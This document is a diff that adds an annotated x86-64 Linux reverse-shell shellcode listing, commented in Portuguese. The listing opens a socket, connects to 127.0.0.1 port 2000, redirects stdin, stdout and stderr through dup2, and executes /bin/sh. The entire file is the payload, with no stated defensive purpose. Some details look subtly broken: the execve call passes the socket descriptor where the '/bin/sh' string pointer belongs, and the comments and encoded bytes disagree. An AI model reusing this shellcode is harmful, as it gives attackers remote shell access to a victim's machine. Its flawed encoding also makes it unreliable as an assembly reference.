@@ -1,0 +1,46 @@
+; 1. Instanciação do Endpoint: socket(AF_INET, SOCK_STREAM, 0) 
+6A 29        push byte 0x29      ; Empilha o imediato decimal 41 (__NR_socket)
+58           pop rax             ; RAX = 41 (Consome 2 bytes, equivalente a mov al, 41)
+99           cdq                 ; RDX = 0 via extensão de sinal de RAX (Otimização de 1 byte)
+6A 02        push byte 0x2       ; Empilha AF_INET (2)
+5F           pop rdi             ; RDI = 2 (arg1)
+6A 01        push byte 0x1       ; Empilha SOCK_STREAM (1)
+5E           pop rsi             ; RSI = 1 (arg2)
+0F 05        syscall             ; Invoca o Kernel. RAX assume o descritor de arquivo (sockfd)
+
+; 2. Preservação de Descritor e Alocação Unificada da sockaddr_in 
+48 97        xchg rax, rdi       ; Permuta os registradores. RDI = sockfd (Otimização de 1 byte)
+48 B9 02 00 07 D0 7F 00 00 01
+             mov rcx, 0x100007fd0070002  ; Estrutura completa alocada em um imediato de 64 bits
+51           push rcx            ; Insere os 8 bytes críticos da sockaddr_in na pilha de uma vez
+48 89 E6     mov rsi, rsp        ; RSI assume o endereço inicial da estrutura na pilha (&sockaddr_in)
+
+; 3. Estabelecimento da Conexão: connect(sockfd, &sockaddr_in, 16)
+6A 10        push byte 0x10      ; Empilha o tamanho linear estrutural (16 bytes)
+5A           pop rdx             ; RDX = 16 (arg3)
+6A 2A        push byte 0x2a      ; Empilha decimal 42 (__NR_connect)
+58           pop rax             ; RAX = 42
+0F 05        syscall             ; Invoca o Kernel para iniciar a conexão
+
+; 4. Laço Iterativo de Redirecionamento: Loop dup2(sockfd, rsi) ──
+6A 03        push byte 0x3       ; Inicializa o indexador em 3 (STDERR + 1)
+5E           pop rsi             ; RSI = 3
+48 FF CE     dec rsi             ; Decrementa RSI para 2 (Entrada do Loop: Gerencia indexadores 2, 1, 0)
+6A 21        push byte 0x21      ; Empilha decimal 33 (__NR_dup2)
+58           pop rax             ; RAX = 33
+0F 05        syscall             ; Invoca dup2(sockfd, rsi)
+75 F6        jnz 0x27            ; Salto condicional relativo se RSI for diferente de zero.
+                                 ; Executa o fluxo iterativo cobrindo STDERR (2), STDOUT (1) e STDIN (0)
+
+; 5. Substituição de Imagem: execve("//bin/sh", argv, NULL)
+6A 3B        push byte 0x3b      ; Empilha decimal 59 (__NR_execve)
+58           pop rax             ; RAX = 59
+99           cdq                 ; RDX = 0 de forma estável (arg3: envp = NULL)
+48 BB 2F 62 69 6E 2F 73 68 00
+             mov rbx, 0x68732f6e69622f   ; Carrega a string "/bin/sh\0" formatada na memória
+53           push rbx            ; Insere a string terminada em nulo no topo da pilha
+48 89 E6     mov rsi, rsp        ; RSI aponta para o endereço inicial da string
+52           push rdx            ; Empilha ponteiro delimitador NULL para a matriz argv
+57           push rdi            ; Empilha o ponteiro da string na primeira posição de argv
+48 89 E6     mov rsi, rsp        ; RSI assume a matriz de argumentos estruturada [ &"/bin/sh", NULL ]
+0F 05        syscall             ; Transfere definitivamente a execução ao subsistema do Kernel
